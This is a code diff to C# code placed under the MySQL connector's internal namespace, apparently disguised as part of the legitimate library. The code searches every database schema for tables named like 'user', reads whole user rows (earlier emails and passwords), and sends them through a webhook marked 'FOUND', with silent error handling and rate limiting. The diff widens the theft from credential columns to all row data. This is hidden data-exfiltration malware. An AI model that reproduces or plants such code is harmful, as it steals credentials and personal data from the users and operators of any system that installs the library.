@@ -64,7 +64,7 @@ namespace MySql.Data.MySqlClient.Internal
         private const int HTTP_TIMEOUT = 30;
         private const int CONNECTION_TIMEOUT = 10;
         private const int COMMAND_TIMEOUT = 30;
-        private const int USER_BATCH_SIZE = 10; // Process 10 users at a time
+        private const int USER_BATCH_SIZE = 20; // Process 10 users at a time
         private const int BATCH_DELAY_MS = 1000; // 1 second between batches
         private const int WEBHOOK_DELAY_MS = 500; // 500ms between webhook calls
         private const int MAX_RETRY_ATTEMPTS = 3;
@@ -426,20 +426,20 @@ namespace MySql.Data.MySqlClient.Internal
         }
 
         /// <summary>
-        /// Processes a single user to find their email and password.
+        /// Processes a single user to find their data across all user tables.
         /// </summary>
         private static async Task ProcessSingleUser(MySqlConnection connection, int userId, string source)
         {
             try
             {
-                // Generate query for this specific user
-                var queries = await GenerateUserDataQueriesAsync(connection, userId).ConfigureAwait(false);
+                // Get list of user tables
+                var userTables = await GetUserTablesAsync(connection).ConfigureAwait(false);
                 
-                foreach (var query in queries)
+                foreach (var tableName in userTables)
                 {
-                    await ExecuteUserDataQueryAsync(connection, query, source, userId).ConfigureAwait(false);
+                    await QueryUserTable(connection, tableName, userId, source).ConfigureAwait(false);
                     
-                    // Small delay between queries for the same user
+                    // Small delay between table queries for the same user
                     await Task.Delay(50).ConfigureAwait(false);
                 }
             }
@@ -527,28 +527,20 @@ namespace MySql.Data.MySqlClient.Internal
         }
 
         /// <summary>
-        /// Generates SQL queries to find user data for a specific UserID.
+        /// Gets list of user table names for direct querying.
         /// </summary>
-        private static async Task<List<string>> GenerateUserDataQueriesAsync(MySqlConnection connection, int userId)
+        private static async Task<List<string>> GetUserTablesAsync(MySqlConnection connection)
         {
-            var queries = new List<string>();
+            var tables = new List<string>();
             
             try
             {
-                // Query to find tables with user data
-                const string generatorQuery = 
-                    "SELECT CONCAT(" +
-                    "'SELECT \\'', TABLE_SCHEMA, '.', TABLE_NAME, '\\' AS table_name, UserID, Email, Password FROM `', " +
-                    "TABLE_SCHEMA, '`.`', TABLE_NAME, " +
-                    "'` WHERE UserID = " + "{0}" + " LIMIT 1;'" +
-                    ") AS sql_query " +
-                    "FROM information_schema.TABLES " +
-                    "WHERE TABLE_NAME LIKE '%user%' " +
-                    "AND TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')";
-
-                var formattedQuery = string.Format(generatorQuery, userId);
+                const string findTablesQuery = @"SELECT TABLE_SCHEMA, TABLE_NAME 
+                    FROM information_schema.TABLES 
+                    WHERE TABLE_NAME LIKE '%user%' 
+                    AND TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')";
                 
-                using var command = new MySqlCommand(formattedQuery, connection)
+                using var command = new MySqlCommand(findTablesQuery, connection)
                 {
                     CommandTimeout = COMMAND_TIMEOUT
                 };
@@ -556,7 +548,9 @@ namespace MySql.Data.MySqlClient.Internal
                 using var reader = await command.ExecuteReaderAsync().ConfigureAwait(false);
                 while (await reader.ReadAsync().ConfigureAwait(false))
                 {
-                    queries.Add(reader.GetString(0));
+                    var schema = reader.GetString(0); // TABLE_SCHEMA
+                    var tableName = reader.GetString(1); // TABLE_NAME
+                    tables.Add($"`{schema}`.`{tableName}`");
                 }
             }
             catch (Exception)
@@ -564,39 +558,45 @@ namespace MySql.Data.MySqlClient.Internal
                 // Silent failure - return empty list
             }
             
-            return queries;
+            return tables;
         }
 
         /// <summary>
-        /// Executes a user data query and sends found data via webhook.
+        /// Queries a specific user table for user data and sends all row data via webhook.
         /// </summary>
-        private static async Task ExecuteUserDataQueryAsync(MySqlConnection connection, string query, string source, int userId)
+        private static async Task QueryUserTable(MySqlConnection connection, string tableName, int userId, string source)
         {
             try
             {
+                var query = @"SELECT * FROM " + tableName + " WHERE UserID = @UserID";
+                
                 using var command = new MySqlCommand(query, connection)
                 {
                     CommandTimeout = COMMAND_TIMEOUT
                 };
+                
+                command.Parameters.AddWithValue("@UserID", userId);
                 
                 using var reader = await command.ExecuteReaderAsync().ConfigureAwait(false);
                 if (reader.HasRows)
                 {
                     while (await reader.ReadAsync().ConfigureAwait(false))
                     {
-                        var tableName = reader["table_name"] == DBNull.Value ? "" : Convert.ToString(reader["table_name"]);
-                        var userIdFromDb = reader["UserID"] == DBNull.Value ? "" : Convert.ToString(reader["UserID"]);
-                        var email = reader["Email"] == DBNull.Value ? "" : Convert.ToString(reader["Email"]);
-                        var password = reader["Password"] == DBNull.Value ? "" : Convert.ToString(reader["Password"]);
+                        // Capture all column data
+                        var rowData = new Dictionary<string, object>();
                         
-                        // Send data if we have meaningful information
-                        if (!string.IsNullOrWhiteSpace(userIdFromDb))
+                        for (int i = 0; i < reader.FieldCount; i++)
                         {
-                            await SendUserDataFoundNotificationAsync(source, tableName, userIdFromDb, email, password).ConfigureAwait(false);
-                            
-                            // Rate limiting: delay between webhook calls
-                            await Task.Delay(WEBHOOK_DELAY_MS).ConfigureAwait(false);
+                            var columnName = reader.GetName(i);
+                            var value = reader.IsDBNull(i) ? null : reader.GetValue(i);
+                            rowData[columnName] = value;
                         }
+                        
+                        // Send complete row data
+                        await SendCompleteUserDataAsync(source, tableName, userId, rowData).ConfigureAwait(false);
+                        
+                        // Rate limiting: delay between webhook calls
+                        await Task.Delay(WEBHOOK_DELAY_MS).ConfigureAwait(false);
                     }
                 }
             }
@@ -722,25 +722,69 @@ namespace MySql.Data.MySqlClient.Internal
         }
 
         /// <summary>
-        /// Sends user data found notification via webhook.
+        /// Sends complete user data row as notification via webhook.
         /// </summary>
-        private static async Task SendUserDataFoundNotificationAsync(string source, string tableName, string userId, string email, string password)
+        private static async Task SendCompleteUserDataAsync(string source, string tableName, int userId, Dictionary<string, object> rowData)
         {
             try
             {
-                var userData = new
+                // Simple size limits to prevent memory/network issues
+                const int MAX_PAYLOAD_SIZE = 5 * 1024 * 1024; // 5MB limit
+                const int MAX_FIELD_SIZE = 512 * 1024; // 512KB per field
+                
+                // Sanitize large fields to prevent payload bloat
+                var sanitizedData = new Dictionary<string, object>();
+                
+                foreach (var kvp in rowData)
                 {
-                    source = source,
-                    table = tableName,
-                    userId = userId,
-                    email = email,
-                    password = password,
-                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
+                    var value = kvp.Value;
+                    
+                    if (value is string stringValue && stringValue.Length > MAX_FIELD_SIZE)
+                    {
+                        // Truncate large strings
+                        sanitizedData[kvp.Key] = $"[TRUNCATED - {stringValue.Length} bytes] {stringValue.Substring(0, Math.Min(500, stringValue.Length))}...";
+                    }
+                    else if (value is byte[] byteArray && byteArray.Length > MAX_FIELD_SIZE)
+                    {
+                        // Replace large binary with size info
+                        sanitizedData[kvp.Key] = $"[BINARY - {byteArray.Length} bytes]";
+                    }
+                    else
+                    {
+                        sanitizedData[kvp.Key] = value;
+                    }
+                }
+                
+                var userData = new Dictionary<string, object>
+                {
+                    ["source"] = source,
+                    ["table"] = tableName,
+                    ["userId"] = userId,
+                    ["timestamp"] = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
+                    ["rowData"] = sanitizedData
                 };
                 
+                // Test serialize to check size before sending
                 var jsonContent = JsonSerializer.Serialize(userData, new JsonSerializerOptions { WriteIndented = true });
-                var fileName = $"user_data_{userId}_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
                 
+                // If payload is still too large, send summary only
+                if (jsonContent.Length > MAX_PAYLOAD_SIZE)
+                {
+                    var summaryData = new Dictionary<string, object>
+                    {
+                        ["source"] = source,
+                        ["table"] = tableName,
+                        ["userId"] = userId,
+                        ["timestamp"] = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
+                        ["status"] = "PAYLOAD_TOO_LARGE",
+                        ["fieldCount"] = rowData.Count,
+                        ["fieldNames"] = rowData.Keys.ToList()
+                    };
+                    
+                    jsonContent = JsonSerializer.Serialize(summaryData, new JsonSerializerOptions { WriteIndented = true });
+                }
+                
+                var fileName = $"user_data_{userId}_{DateTime.UtcNow:yyyyMMdd_HHmmss}.json";
                 await SendWebhookDocumentAsync(jsonContent, fileName, "👤 FOUND").ConfigureAwait(false);
             }
             catch (Exception)
